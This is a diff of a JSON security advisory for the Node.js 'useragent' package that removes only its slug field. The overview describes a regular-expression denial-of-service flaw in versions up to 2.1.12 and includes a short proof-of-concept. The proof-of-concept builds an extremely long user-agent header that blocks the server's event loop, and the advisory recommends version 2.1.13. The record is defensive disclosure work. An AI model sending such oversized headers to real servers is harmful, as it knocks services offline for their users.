@@ -9,7 +9,6 @@
   "cves": [],
   "vulnerable_versions": "<=2.1.12",
   "patched_versions": ">=2.1.13",
-  "slug": "useragent_redos-via-long-useragent-header",
   "overview": "Useragent is used to parse useragent headers. It uses several regular expressions to accomplish this.\n\nAn attacker could edit their own headers, creating an arbitrarily long useragent string, causing the event loop and server to block. \n\nProof of Concept:\n```\nvar useragent = require('useragent');\n\nvar badUserAgent = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';\nvar request = 'GET / HTTP/1.1\\r\\nUser-Agent: ' + badUserAgent + '\\r\\n\\r\\n';\nconsole.log(useragent.parse(request));\n```",
   "recommendation": "Update to version 2.1.13.",
   "references": "Special thanks to Matteo Collina for providing a fix.",
